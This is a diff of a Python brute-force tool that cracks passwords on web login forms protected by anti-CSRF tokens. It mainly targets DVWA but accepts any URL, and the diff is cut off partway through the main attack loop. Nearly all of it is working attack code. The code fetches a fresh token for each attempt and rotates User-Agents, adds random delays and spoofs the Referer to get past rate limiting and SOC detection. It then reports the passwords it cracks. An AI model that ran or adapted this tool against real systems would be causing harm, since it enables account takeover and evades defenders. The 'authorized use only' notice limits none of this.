@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-CSRF-Aware Brute Force Engine
-==============================
+CSRF-Aware Brute Force Engine v2.0
+====================================
 A penetration testing tool that bypasses Anti-CSRF token mechanisms
 to perform authenticated brute-force attacks against login forms.
 
@@ -9,6 +9,13 @@ Target: DVWA (Damn Vulnerable Web Application) or similar CSRF-protected forms.
 Framework Alignment: MITRE ATT&CK T1110.001 (Brute Force: Password Guessing)
 
 AUTHORIZED USE ONLY - Ensure written permission before testing.
+
+v2.0 Changes:
+  - Full URL flexibility (no static path appending)
+  - Rich colorized terminal output with box-drawing UI
+  - Results cache with summary table on exit
+  - Graceful Ctrl+C handling with summary display
+  - Signal-safe loop control
 
 Algorithm Steps Implemented:
   1. Session Initialization & State Management
@@ -25,11 +32,53 @@ import re
 import sys
 import time
 import random
+import signal
 import argparse
-import logging
 from datetime import datetime
-from typing import Optional, Tuple
-from urllib.parse import urljoin
+from typing import Optional, Tuple, List, Dict
+from urllib.parse import urlparse
+
+# ============================================================================
+# ANSI Color Constants — Rich Terminal UI
+# ============================================================================
+class C:
+    """ANSI escape codes for colorized terminal output."""
+    # Reset
+    RST     = "\033[0m"
+    # Styles
+    BOLD    = "\033[1m"
+    DIM     = "\033[2m"
+    ULINE   = "\033[4m"
+    # Foreground
+    RED     = "\033[31m"
+    GREEN   = "\033[32m"
+    YELLOW  = "\033[33m"
+    BLUE    = "\033[34m"
+    MAGENTA = "\033[35m"
+    CYAN    = "\033[36m"
+    WHITE   = "\033[37m"
+    GREY    = "\033[90m"
+    # Bright foreground
+    BRED    = "\033[91m"
+    BGREEN  = "\033[92m"
+    BYELLOW = "\033[93m"
+    BBLUE   = "\033[94m"
+    BMAGENTA= "\033[95m"
+    BCYAN   = "\033[96m"
+    # Background
+    BG_RED  = "\033[41m"
+    BG_GREEN= "\033[42m"
+    BG_YELLOW="\033[43m"
+
+# Box-drawing characters for UI frames
+BOX_TL = "╔"
+BOX_TR = "╗"
+BOX_BL = "╚"
+BOX_BR = "╝"
+BOX_H  = "═"
+BOX_V  = "║"
+BOX_ML = "╠"
+BOX_MR = "╣"
 
 # ============================================================================
 # OPSEC: User-Agent Rotation Pool
@@ -37,92 +86,248 @@ from urllib.parse import urljoin
 # and SOC/SIEM signature-based detection (MITRE ATT&CK T1036.005)
 # ============================================================================
 USER_AGENTS = [
-    # Chrome on Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    # Firefox on Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) "
     "Gecko/20100101 Firefox/126.0",
-    # Chrome on macOS
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    # Safari on macOS
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 "
     "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-    # Edge on Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-    # Firefox on Linux
     "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    # Chrome on Linux
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
 ]
 
 
-def setup_logging(verbose: bool = False) -> logging.Logger:
-    """Configure structured logging for operational audit trail."""
-    logger = logging.getLogger("csrf_brute")
-    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
+# ============================================================================
+# Results Cache — Tracks all attempts for summary display
+# ============================================================================
+class ResultsCache:
+    """
+    In-memory cache for all brute-force attempt results.
+    
+    Stores every attempt with its outcome, timing, and HTTP status.
+    On exit (success, Ctrl+C, or exhaustion), prints a formatted
+    summary table showing all caught credentials and statistics.
+    """
+    
+    def __init__(self):
+        self.attempts: List[Dict] = []
+        self.successes: List[Dict] = []
+        self.start_time: Optional[datetime] = None
+        self.target_url: str = ""
+        self.username: str = ""
+    
+    def record_attempt(
+        self,
+        password: str,
+        success: bool,
+        status_code: int,
+        elapsed_ms: float
+    ):
+        """Record a single login attempt result."""
+        entry = {
+            "password": password,
+            "success": success,
+            "status_code": status_code,
+            "elapsed_ms": elapsed_ms,
+            "timestamp": datetime.now(),
+        }
+        self.attempts.append(entry)
+        if success:
+            self.successes.append(entry)
+    
+    def print_summary(self):
+        """
+        Print a rich, colorized summary of the attack session.
+        Shows all successful logins if any were caught.
+        Called on success, Ctrl+C interrupt, or wordlist exhaustion.
+        """
+        total = len(self.attempts)
+        if total == 0:
+            print(f"\n{C.YELLOW}  No attempts were made.{C.RST}")
+            return
+        
+        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
+        success_count = len(self.successes)
+        fail_count = total - success_count
+        
+        w = 65  # box width
+        
+        print()
+        print(f"{C.CYAN}{BOX_TL}{BOX_H * (w - 2)}{BOX_TR}{C.RST}")
+        print(f"{C.CYAN}{BOX_V}{C.RST}{C.BOLD}{C.BCYAN}  {'SESSION SUMMARY':^{w - 4}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
+        print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
+        
+        # Stats
+        print(f"{C.CYAN}{BOX_V}{C.RST}  Target       {C.DIM}:{C.RST}  {self.target_url:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
+        print(f"{C.CYAN}{BOX_V}{C.RST}  Username     {C.DIM}:{C.RST}  {self.username:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
+        print(f"{C.CYAN}{BOX_V}{C.RST}  Total Tries  {C.DIM}:{C.RST}  {total:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
+        print(f"{C.CYAN}{BOX_V}{C.RST}  Duration     {C.DIM}:{C.RST}  {elapsed:.1f}s{' ' * (w - 20 - len(f'{elapsed:.1f}s'))}{C.CYAN}{BOX_V}{C.RST}")
+        
+        fail_str = f"{C.RED}{fail_count}{C.RST}"
+        # We need to account for ANSI codes in padding
+        fail_display = f"{fail_count}"
+        print(f"{C.CYAN}{BOX_V}{C.RST}  Failed       {C.DIM}:{C.RST}  {fail_str}{' ' * (w - 20 - len(fail_display))}{C.CYAN}{BOX_V}{C.RST}")
+        
+        success_str = f"{C.BGREEN}{success_count}{C.RST}"
+        success_display = f"{success_count}"
+        print(f"{C.CYAN}{BOX_V}{C.RST}  Cracked      {C.DIM}:{C.RST}  {success_str}{' ' * (w - 20 - len(success_display))}{C.CYAN}{BOX_V}{C.RST}")
+        
+        if total > 0:
+            rate = total / elapsed if elapsed > 0 else 0
+            rate_str = f"{rate:.2f} req/s"
+            print(f"{C.CYAN}{BOX_V}{C.RST}  Avg Rate     {C.DIM}:{C.RST}  {rate_str:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
+        
+        # Successful logins section
+        if self.successes:
+            print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
+            header = "  🔓 CRACKED CREDENTIALS"
+            print(f"{C.CYAN}{BOX_V}{C.RST}{C.BOLD}{C.BGREEN}{header:<{w - 2}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
+            print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
+            
+            for i, s in enumerate(self.successes, 1):
+                cred_line = f"  [{i}]  {self.username} : {s['password']}"
+                time_str = s['timestamp'].strftime('%H:%M:%S')
+                detail = f"{cred_line:<40} {C.DIM}@ {time_str}{C.RST}"
+                # Padding is tricky with ANSI; just print it
+                print(f"{C.CYAN}{BOX_V}{C.RST}{C.BGREEN}{C.BOLD}  [{i}]{C.RST}  {C.WHITE}{self.username}{C.RST} : {C.BGREEN}{C.BOLD}{s['password']}{C.RST}{C.DIM}  (attempt #{self.attempts.index(s) + 1} @ {time_str}){C.RST}")
+        else:
+            print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
+            no_cred = "  No credentials were cracked."
+            print(f"{C.CYAN}{BOX_V}{C.RST}{C.YELLOW}{no_cred:<{w - 2}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
+        
+        print(f"{C.CYAN}{BOX_BL}{BOX_H * (w - 2)}{BOX_BR}{C.RST}")
+        print()
 
-    # Console handler with color-coded output
-    console = logging.StreamHandler(sys.stdout)
-    console.setLevel(logging.DEBUG if verbose else logging.INFO)
-    fmt = logging.Formatter(
-        "\033[90m[%(asctime)s]\033[0m %(message)s",
-        datefmt="%H:%M:%S"
-    )
-    console.setFormatter(fmt)
-    logger.addHandler(console)
 
-    return logger
+# Global cache instance and interrupt flag
+_results_cache = ResultsCache()
+_interrupted = False
+
+
+def _signal_handler(signum, frame):
+    """
+    Graceful Ctrl+C handler.
+    Sets the interrupt flag so the loop breaks cleanly,
+    then prints the summary with any caught credentials.
+    """
+    global _interrupted
+    _interrupted = True
+    print(f"\n\n{C.BYELLOW}{C.BOLD}  ⚡ Interrupted by user (Ctrl+C){C.RST}")
+    print(f"{C.YELLOW}  Stopping attack loop... preparing summary{C.RST}")
+
+
+# ============================================================================
+# Pretty Printer — Colorized per-attempt output
+# ============================================================================
+def print_attempt(
+    attempt_num: int,
+    total: int,
+    username: str,
+    password: str,
+    success: bool,
+    status_code: int,
+    verbose: bool = False
+):
+    """
+    Print a single attempt result with rich color coding.
+    
+    PASS  = Red background, indicates failed attempt
+    FOUND = Green background with highlight, indicates cracked credential
+    """
+    # Progress bar
+    pct = (attempt_num / total) * 100 if total > 0 else 0
+    bar_width = 20
+    filled = int(bar_width * attempt_num / total) if total > 0 else 0
+    bar = f"{C.GREEN}{'█' * filled}{C.GREY}{'░' * (bar_width - filled)}{C.RST}"
+    
+    progress = f"{C.DIM}[{attempt_num}/{total}]{C.RST}"
+    pct_str = f"{C.DIM}{pct:5.1f}%{C.RST}"
+    
+    if success:
+        # ══════════════ FOUND ══════════════
+        tag = f"{C.BG_GREEN}{C.BOLD}{C.WHITE} FOUND {C.RST}"
+        cred = f"{C.BGREEN}{C.BOLD}{username}{C.RST} : {C.BGREEN}{C.BOLD}{password}{C.RST}"
+        status = f"{C.GREEN}HTTP {status_code}{C.RST}"
+        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}")
+    else:
+        # ══════════════ PASS ══════════════
+        tag = f"{C.BG_RED}{C.WHITE}{C.BOLD} PASS  {C.RST}"
+        cred = f"{C.DIM}{username}{C.RST} : {C.WHITE}{password}{C.RST}"
+        status = f"{C.DIM}HTTP {status_code}{C.RST}"
+        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}")
+
+
+def print_banner(
+    target_url: str,
+    username: str,
+    wordlist_path: str,
+    total_passwords: int,
+    token_name: str,
+    jitter_range: Tuple[float, float],
+    rotate_ua: bool,
+    proxy: Optional[str]
+):
+    """Print a rich startup banner with attack configuration."""
+    w = 65
+    
+    print()
+    print(f"{C.MAGENTA}{BOX_TL}{BOX_H * (w - 2)}{BOX_TR}{C.RST}")
+    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BOLD}{C.BMAGENTA}⚔  CSRF-Aware Brute Force Engine v2.0{' ' * (w - 42)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
+    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.DIM}MITRE ATT&CK: T1110.001 | Cyber Kill Chain: Exploitation{' ' * (w - 62)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
+    print(f"{C.MAGENTA}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
+    
+    # Config lines
+    configs = [
+        ("Target",     target_url),
+        ("Username",   username),
+        ("Wordlist",   f"{wordlist_path} ({total_passwords} passwords)"),
+        ("Token",      f"{token_name} (auto-refresh per request)"),
+        ("Jitter",     f"{jitter_range[0]:.1f}s — {jitter_range[1]:.1f}s"),
+        ("UA Rotate",  "Enabled ✓" if rotate_ua else "Disabled ✗"),
+        ("Proxy",      proxy or "Direct connection"),
+    ]
+    
+    for label, value in configs:
+        # Truncate long values
+        max_val = w - 20
+        display = value if len(value) <= max_val else value[:max_val - 3] + "..."
+        print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.CYAN}{label:<12}{C.RST}{C.DIM}:{C.RST} {display}")
+    
+    print(f"{C.MAGENTA}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
+    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BYELLOW}⚠  AUTHORIZED PENETRATION TESTING USE ONLY{' ' * (w - 48)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
+    print(f"{C.MAGENTA}{BOX_BL}{BOX_H * (w - 2)}{BOX_BR}{C.RST}")
+    print()
 
 
 # ============================================================================
 # STEP 1: Session Initialization & State Management
 # ============================================================================
-# Rationale: Establish a persistent HTTP session that automatically manages
-# cookies (PHPSESSID). This maintains server-side state across requests,
-# which is CRITICAL because CSRF tokens are bound to the session.
-# Without session persistence, each request would generate a new session
-# and the extracted token would be invalid.
-# ============================================================================
 
 def init_session(
     target_url: str,
     proxy: Optional[str] = None,
-    logger: Optional[logging.Logger] = None
+    verbose: bool = False
 ) -> requests.Session:
     """
     STEP 1: Initialize a persistent HTTP session with the target.
-
-    Creates a requests.Session object that:
-    - Automatically stores and sends PHPSESSID cookies
-    - Maintains TCP connection keep-alive for performance
-    - Optionally routes through a proxy (Burp Suite, mitmproxy)
-
-    OpSec Note: Proxy support enables traffic inspection and replay
-    through tools like Burp Suite for validation.
-
-    Args:
-        target_url: Base URL of the target application
-        proxy: Optional HTTP proxy (e.g., "http://127.0.0.1:8080")
-        logger: Logger instance
-
-    Returns:
-        Configured requests.Session with initial cookies set
+    
+    Creates a requests.Session that automatically stores and sends
+    PHPSESSID cookies, maintaining server-side state across requests.
+    This is CRITICAL because CSRF tokens are bound to the session.
     """
     session = requests.Session()
 
-    # Configure proxy for traffic interception if specified
     if proxy:
         session.proxies = {"http": proxy, "https": proxy}
-        # Disable SSL verification when proxying (Burp uses self-signed certs)
         session.verify = False
-        if logger:
-            logger.debug(f"  Proxy configured: {proxy}")
+        if verbose:
+            print(f"  {C.DIM}[STEP 1] Proxy configured: {proxy}{C.RST}")
 
-    # Set initial headers to appear as a legitimate browser
     session.headers.update({
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9",
@@ -131,22 +336,20 @@ def init_session(
         "Upgrade-Insecure-Requests": "1",
     })
 
-    # Perform initial connection to receive session cookie (PHPSESSID)
+    # Extract base URL for initial connection
+    parsed = urlparse(target_url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
+
     try:
-        init_response = session.get(target_url, timeout=10)
+        init_response = session.get(base_url, timeout=10)
         init_response.raise_for_status()
-
-        if logger:
-            cookies = dict(session.cookies)
-            logger.info(
-                f"\033[32m[STEP 1]\033[0m Session initialized | "
-                f"Status: {init_response.status_code} | "
-                f"Cookies: {cookies}"
-            )
-
+        cookies = dict(session.cookies)
+        print(
+            f"  {C.GREEN}[STEP 1]{C.RST} Session initialized {C.DIM}|{C.RST} "
+            f"Cookies: {C.CYAN}{cookies}{C.RST}"
+        )
     except requests.RequestException as e:
-        if logger:
-            logger.error(f"\033[31m[STEP 1 FAIL]\033[0m Connection failed: {e}")
+        print(f"  {C.BRED}[STEP 1 FAIL]{C.RST} Connection failed: {e}")
         raise SystemExit(f"[!] Cannot reach target: {e}")
 
     return session
@@ -155,80 +358,52 @@ def init_session(
 # ============================================================================
 # STEP 2 & 3: Dynamic Data Retrieval + DOM Parsing
 # ============================================================================
-# Rationale: CSRF tokens are single-use cryptographic nonces embedded in
-# the HTML form. We must fetch a fresh page (GET) before each login attempt
-# to obtain a valid token. The token is then extracted via regex or HTML
-# parsing from the hidden input field.
-#
-# Why Regex over BeautifulSoup here: For a known, stable DOM structure
-# (like DVWA), regex is faster and has zero external dependencies.
-# For complex/dynamic DOMs, BeautifulSoup would be preferred.
-# ============================================================================
 
 def fetch_csrf_token(
     session: requests.Session,
     login_url: str,
     token_name: str = "user_token",
-    logger: Optional[logging.Logger] = None
+    verbose: bool = False
 ) -> str:
     """
     STEP 2 + 3: Fetch the login page and extract the fresh CSRF token.
-
-    Step 2 - Sends GET request to retrieve HTML containing the token.
-    Step 3 - Parses the DOM to extract the token value using regex.
-
-    The regex pattern targets:
-        <input type="hidden" name="user_token" value="CSRF_TOKEN_HERE">
-
-    OpSec Consideration: Each GET request mimics normal browsing behavior.
-    Fetching the page before each login attempt is indistinguishable from
-    a legitimate user refreshing the page after a failed login.
-
-    Args:
-        session: Active requests.Session with valid cookies
-        login_url: URL of the login form
-        token_name: Name attribute of the hidden CSRF input field
-        logger: Logger instance
-
-    Returns:
-        Extracted CSRF token string
-
-    Raises:
-        ValueError: If token cannot be found in the response
+    
+    Sends a GET request to retrieve the HTML, then parses the DOM
+    via regex to extract the token value from the hidden input field.
+    
+    The token is DYNAMIC and AUTOMATED — every single call fetches
+    a brand new token from the server. Nothing is static or cached.
+    The username/password fields are NOT checked here; only the
+    CSRF nonce is extracted.
     """
-    # STEP 2: GET request to fetch fresh HTML
     try:
         response = session.get(login_url, timeout=10)
         response.raise_for_status()
     except requests.RequestException as e:
-        if logger:
-            logger.error(f"\033[31m[STEP 2 FAIL]\033[0m GET failed: {e}")
+        if verbose:
+            print(f"  {C.BRED}[STEP 2 FAIL]{C.RST} GET failed: {e}")
         raise
 
-    if logger:
-        logger.debug(
-            f"\033[36m[STEP 2]\033[0m Page fetched | "
-            f"Status: {response.status_code} | "
+    if verbose:
+        print(
+            f"  {C.CYAN}[STEP 2]{C.RST} Page fetched {C.DIM}|{C.RST} "
+            f"Status: {response.status_code} {C.DIM}|{C.RST} "
             f"Size: {len(response.text)} bytes"
         )
 
-    # STEP 3: DOM Parsing - Extract token via regex
-    # Pattern explanation:
-    #   name=['"]?{token_name}['"]?  -> matches the token field name
-    #   value=['"]?([a-fA-F0-9]+)    -> captures the hex token value
+    # Regex to extract token value from hidden input field
     pattern = rf"""<input\s+[^>]*name\s*=\s*['"]?{re.escape(token_name)}['"]?\s+[^>]*value\s*=\s*['"]?([a-fA-F0-9]+)['"]?"""
-
     match = re.search(pattern, response.text, re.IGNORECASE)
 
     if not match:
-        # Fallback: try reversed attribute order (value before name)
+        # Fallback: reversed attribute order (value before name)
         alt_pattern = rf"""<input\s+[^>]*value\s*=\s*['"]?([a-fA-F0-9]+)['"]?\s+[^>]*name\s*=\s*['"]?{re.escape(token_name)}['"]?"""
         match = re.search(alt_pattern, response.text, re.IGNORECASE)
 
     if not match:
-        if logger:
-            logger.error(
-                f"\033[31m[STEP 3 FAIL]\033[0m Token '{token_name}' "
+        if verbose:
+            print(
+                f"  {C.BRED}[STEP 3 FAIL]{C.RST} Token '{token_name}' "
                 f"not found in response body"
             )
         raise ValueError(
@@ -237,10 +412,9 @@ def fetch_csrf_token(
         )
 
     token = match.group(1)
-
-    if logger:
-        logger.debug(
-            f"\033[36m[STEP 3]\033[0m Token extracted | "
+    if verbose:
+        print(
+            f"  {C.CYAN}[STEP 3]{C.RST} Token extracted {C.DIM}|{C.RST} "
             f"{token_name}={token[:8]}...{token[-4:]}"
         )
 
@@ -249,12 +423,6 @@ def fetch_csrf_token(
 
 # ============================================================================
 # STEP 4: Payload Construction
-# ============================================================================
-# Rationale: Assemble the POST body by combining:
-#   - The fresh CSRF token (from Step 3)
-#   - The current username/password attempt (from wordlist)
-#   - Static form parameters (e.g., Login=Login)
-# This payload must exactly replicate what the browser would send.
 # ============================================================================
 
 def build_payload(
@@ -266,23 +434,8 @@ def build_payload(
 ) -> dict:
     """
     STEP 4: Construct the POST payload with credentials and CSRF token.
-
+    
     Replicates the exact form submission a legitimate browser would send.
-    The payload structure must match the server's expected parameter names
-    and values, or the request will be rejected.
-
-    DVWA expected parameters:
-        username=<user>&password=<pass>&Login=Login&user_token=<token>
-
-    Args:
-        username: Current username attempt
-        password: Current password attempt
-        csrf_token: Fresh CSRF token from Step 3
-        token_name: CSRF token parameter name
-        extra_params: Additional form fields (e.g., {"Login": "Login"})
-
-    Returns:
-        Dictionary representing the POST body
     """
     payload = {
         "username": username,
@@ -290,11 +443,9 @@ def build_payload(
         token_name: csrf_token,
     }
 
-    # Add static form parameters (e.g., submit button value)
     if extra_params:
         payload.update(extra_params)
     else:
-        # DVWA default: Login button parameter
         payload["Login"] = "Login"
 
     return payload
@@ -303,14 +454,6 @@ def build_payload(
 # ============================================================================
 # STEP 5: Execution & Evasion
 # ============================================================================
-# Rationale: Send the crafted payload via POST. OpSec measures include:
-#   - User-Agent rotation to evade fingerprinting
-#   - Random jitter between requests to avoid rate-limit triggers
-#   - Referer header spoofing to appear as organic navigation
-# These techniques map to MITRE ATT&CK:
-#   T1036.005 - Masquerading: Match Legitimate Name or Location
-#   T1071.001 - Application Layer Protocol: Web Protocols
-# ============================================================================
 
 def execute_attempt(
     session: requests.Session,
@@ -318,61 +461,52 @@ def execute_attempt(
     payload: dict,
     jitter_range: Tuple[float, float] = (0.5, 2.0),
     rotate_ua: bool = True,
-    logger: Optional[logging.Logger] = None
+    verbose: bool = False
 ) -> requests.Response:
     """
     STEP 5: Execute the login attempt with evasion techniques.
-
-    Sends the POST request while implementing OpSec measures:
-    1. User-Agent Rotation: Randomly selects from a pool of legitimate
-       browser UA strings to defeat signature-based detection.
-    2. Jitter/Delay: Introduces random delays between requests to avoid
-       triggering rate-limit or anomaly-detection rules.
-    3. Referer Spoofing: Sets the Referer header to the login page URL,
-       mimicking organic browser navigation flow.
-
-    Args:
-        session: Active session with cookies
-        login_url: Target login endpoint
-        payload: POST body from Step 4
-        jitter_range: (min, max) seconds of random delay
-        rotate_ua: Whether to rotate User-Agent headers
-        logger: Logger instance
-
-    Returns:
-        Server's HTTP response object
+    
+    OpSec measures:
+    - User-Agent rotation per request
+    - Random jitter delay between requests
+    - Referer header spoofing
     """
-    # Evasion: Random delay to avoid triggering rate-limit alarms
+    # Jitter delay — sleep in small increments so Ctrl+C is responsive
     delay = random.uniform(*jitter_range)
-    if logger:
-        logger.debug(f"\033[33m[STEP 5]\033[0m Jitter delay: {delay:.2f}s")
-    time.sleep(delay)
+    if verbose:
+        print(f"  {C.YELLOW}[STEP 5]{C.RST} Jitter: {delay:.2f}s")
+    
+    # Sleep in 0.1s increments for responsive interrupt handling
+    remaining = delay
+    while remaining > 0 and not _interrupted:
+        chunk = min(remaining, 0.1)
+        time.sleep(chunk)
+        remaining -= chunk
+    
+    if _interrupted:
+        raise KeyboardInterrupt("Interrupted during jitter")
 
-    # Evasion: Rotate User-Agent to evade fingerprinting
     if rotate_ua:
-        ua = random.choice(USER_AGENTS)
-        session.headers["User-Agent"] = ua
+        session.headers["User-Agent"] = random.choice(USER_AGENTS)
 
-    # Evasion: Spoof Referer to appear as organic navigation
     session.headers["Referer"] = login_url
 
-    # Execute POST
     try:
         response = session.post(
             login_url,
             data=payload,
-            allow_redirects=False,  # Capture 302 redirects for analysis
+            allow_redirects=False,
             timeout=10
         )
     except requests.RequestException as e:
-        if logger:
-            logger.error(f"\033[31m[STEP 5 FAIL]\033[0m POST failed: {e}")
+        if verbose:
+            print(f"  {C.BRED}[STEP 5 FAIL]{C.RST} POST failed: {e}")
         raise
 
-    if logger:
-        logger.debug(
-            f"\033[33m[STEP 5]\033[0m POST sent | "
-            f"Status: {response.status_code} | "
+    if verbose:
+        print(
+            f"  {C.YELLOW}[STEP 5]{C.RST} POST sent {C.DIM}|{C.RST} "
+            f"Status: {response.status_code} {C.DIM}|{C.RST} "
             f"Size: {len(response.text)} bytes"
         )
 
@@ -382,83 +516,53 @@ def execute_attempt(
 # ============================================================================
 # STEP 6: Response Analysis
 # ============================================================================
-# Rationale: Determine if the login attempt succeeded by analyzing:
-#   1. HTTP status codes (302 = redirect to dashboard = SUCCESS)
-#   2. Response body content (absence of failure string = SUCCESS)
-#   3. HTTP 403 = account lockout or WAF block (ABORT)
-#
-# This is the decision point that determines whether to continue
-# the brute-force loop or halt with a success.
-# ============================================================================
 
 def analyze_response(
     response: requests.Response,
     failure_string: str = "Login failed",
     success_path: str = "/dashboard",
-    logger: Optional[logging.Logger] = None
+    verbose: bool = False
 ) -> bool:
     """
     STEP 6: Analyze the server's response to determine success/failure.
-
-    Success indicators:
-    - HTTP 302 redirect to an authenticated endpoint (e.g., /dashboard)
-    - Absence of the failure string in the response body
-    - Presence of success indicators (e.g., "Welcome", "Logout")
-
-    Failure indicators:
-    - Failure string present in response body
-    - HTTP 403 (Forbidden) - may indicate WAF/rate-limit block
-    - HTTP 200 with the login form still present
-
-    Args:
-        response: HTTP response from the POST attempt
-        failure_string: Text that indicates a failed login
-        success_path: URL path that indicates successful authentication
-        logger: Logger instance
-
-    Returns:
-        True if login succeeded, False if failed
+    
+    Checks HTTP status codes, response body for failure/success strings,
+    and redirect locations.
     """
     status = response.status_code
 
-    # Check for WAF/rate-limit block
     if status == 403:
-        if logger:
-            logger.warning(
-                "\033[31m[STEP 6]\033[0m HTTP 403 received - "
+        if verbose:
+            print(
+                f"  {C.BRED}[STEP 6]{C.RST} HTTP 403 — "
                 "possible WAF block or account lockout"
             )
         return False
 
-    # Check for redirect to authenticated area (strong success signal)
     if status in (301, 302):
         location = response.headers.get("Location", "")
         if success_path in location:
-            if logger:
-                logger.info(
-                    f"\033[32m[STEP 6]\033[0m Redirect to {location} - "
-                    f"SUCCESS INDICATOR"
+            if verbose:
+                print(
+                    f"  {C.BGREEN}[STEP 6]{C.RST} Redirect to {location} — "
+                    "SUCCESS INDICATOR"
                 )
             return True
 
-    # Analyze response body for failure/success strings
     body = response.text
 
-    # Check for explicit failure
     if failure_string.lower() in body.lower():
         return False
 
-    # If no failure string found AND we got a 200, check for success indicators
-    # (The page loaded but doesn't show an error = potential success)
+    # No failure string + HTTP 200 → check for success indicators
     if status == 200 and failure_string.lower() not in body.lower():
-        # Additional heuristic: check if we're now on an authenticated page
         success_indicators = ["logout", "sign out", "welcome", "dashboard"]
         for indicator in success_indicators:
             if indicator.lower() in body.lower():
-                if logger:
-                    logger.info(
-                        f"\033[32m[STEP 6]\033[0m Success indicator "
-                        f"'{indicator}' found in response body"
+                if verbose:
+                    print(
+                        f"  {C.BGREEN}[STEP 6]{C.RST} Success indicator "
+                        f"'{indicator}' found in body"
                     )
                 return True
 
@@ -466,31 +570,11 @@ def analyze_response(
 
 
 # ============================================================================
-# STEP 7: Reset & Loop (Main Attack Loop)
-# ============================================================================
-# Rationale: Orchestrates the full attack cycle. After each failed attempt:
-#   1. Discard the used (now invalid) CSRF token from memory
-#   2. Return to Step 2 to fetch a fresh token via GET
-#   3. Continue with the next password from the wordlist
-#
-# The token MUST be refreshed because CSRF tokens in secure implementations
-# are single-use (nonce). Reusing a consumed token will result in a
-# server-side rejection, causing every subsequent attempt to fail.
+# STEP 7: Reset & Loop (Main Attack Orchestrator)
 # ============================================================================
 
 def load_wordlist(filepath: str) -> list:
-    """
-    Load password wordlist from file.
-
-    Handles common encoding issues and strips whitespace.
-    Skips empty lines and comments (lines starting with #).
-
-    Args:
-        filepath: Path to the wordlist file
-
-    Returns:
-        List of password strings
-    """
+    """Load password wordlist from file."""
     passwords = []
     try:
         with open(filepath, "r", encoding="utf-8", errors="replace") as f:
@@ -502,13 +586,11 @@ def load_wordlist(filepath: str) -> list:
         raise SystemExit(f"[!] Wordlist not found: {filepath}")
     except PermissionError:
         raise SystemExit(f"[!] Permission denied: {filepath}")
-
     return passwords
 
 
 def run_attack(
     target_url: str,
-    login_path: str,
     username: str,
     wordlist_path: str,
     token_name: str = "user_token",
@@ -521,173 +603,198 @@ def run_attack(
     output_file: Optional[str] = None,
 ) -> Optional[str]:
     """
-    STEP 7: Main attack orchestrator - Reset & Loop.
-
-    Implements the complete attack cycle:
-        INIT -> [GET page -> Extract token -> Build payload ->
-                 POST login -> Analyze -> Reset token] -> LOOP
-
-    This function coordinates all 7 steps in sequence, handling:
-    - Token refresh after each attempt (single-use nonce invalidation)
-    - Wordlist iteration
-    - Success/failure reporting
-    - Graceful error handling and retry logic
-
-    Args:
-        target_url: Base URL (e.g., "http://192.168.1.100")
-        login_path: Login endpoint path (e.g., "/vulnerabilities/brute/")
-        username: Target username to brute-force
-        wordlist_path: Path to password wordlist file
-        token_name: CSRF token parameter name
-        failure_string: String indicating failed login
-        success_path: URL path indicating successful auth
-        jitter_range: (min, max) jitter delay in seconds
-        rotate_ua: Enable User-Agent rotation
-        proxy: Optional proxy URL
-        verbose: Enable debug logging
-        output_file: Optional file to write results
-
-    Returns:
-        The cracked password if found, None otherwise
+    STEP 7: Main attack orchestrator — Reset & Loop.
+    
+    Coordinates all 7 steps in sequence:
+      INIT → [GET → Extract token → Build payload →
+              POST → Analyze → Reset token] → LOOP
+    
+    Features:
+    - Results cache: every attempt is recorded
+    - Ctrl+C handling: interrupt prints summary with caught creds
+    - Loop break: stops immediately on success
+    - Token refresh: fresh CSRF nonce per iteration (fully automated)
+    
+    The -t/--target parameter is now the FULL attack URL.
+    No path is appended. You control exactly what endpoint gets hit.
     """
-    logger = setup_logging(verbose)
-    login_url = urljoin(target_url.rstrip("/") + "/", login_path.lstrip("/"))
-
-    # Banner
-    logger.info("=" * 65)
-    logger.info("\033[1;35m  CSRF-Aware Brute Force Engine\033[0m")
